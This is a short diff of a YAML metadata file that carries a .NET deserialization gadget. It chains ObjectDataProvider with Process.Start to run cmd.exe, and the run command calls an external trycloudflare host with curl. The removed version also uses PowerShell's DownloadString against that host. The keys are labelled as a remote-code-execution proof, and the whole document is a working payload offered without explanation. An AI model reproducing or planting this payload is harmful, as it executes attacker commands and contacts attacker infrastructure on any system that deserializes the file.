@@ -1,10 +1,10 @@
 metadata:
-  rce_proof_r036: !<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
+  rce_proof_r036b: !<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
     MethodName: Start,
     ObjectInstance: !<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
       StartInfo: !<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
         FileName: cmd.exe,
-        Arguments: '/c curl -s https://oriental-initiative-close-bracelets.trycloudflare.com/r036-x179317040522036 || powershell -c "(New-Object Net.WebClient).DownloadString(''https://oriental-initiative-close-bracelets.trycloudflare.com/r036-x179317040522036-ps'')"'
+        Arguments: '/c curl -s https://oriental-initiative-close-bracelets.trycloudflare.com/r036b-y1793170768 & ping -n 50 127.0.0.1 >nul'
       }
     }
   }
